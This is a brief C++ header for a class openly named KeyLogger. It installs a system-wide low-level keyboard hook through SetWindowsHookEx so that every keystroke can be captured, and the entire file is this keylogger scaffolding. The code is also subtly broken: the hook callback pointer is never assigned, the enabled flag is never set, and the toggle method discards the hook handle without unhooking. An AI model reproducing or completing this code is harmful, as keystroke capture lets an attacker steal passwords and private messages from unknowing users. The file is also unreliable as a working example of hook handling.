#pragma once
#include <windows.h>
#include <iostream>

using namespace std;

class KeyLogger
{
	HHOOK HK;
	KBDLLHOOKSTRUCT kbdStruct;

    bool is_enabled = false;

    LRESULT(*HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);

    void SetHook()
    {
        if (!(HK = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallbackKeyboard, NULL, 0)))
        {
            MessageBox(NULL, L"Failed to install hook on keyboard!", L"Error", MB_ICONERROR);
        }
    }

public:
    KeyLogger(bool enable) {
        if (!enable) {
            HK = NULL;
        }
        else {
            SetHook();
        }
    }

    void ToggleOn() {
        if (is_enabled) {
            HK = NULL;
        }
        else {
            SetHook();
        }
    }

};

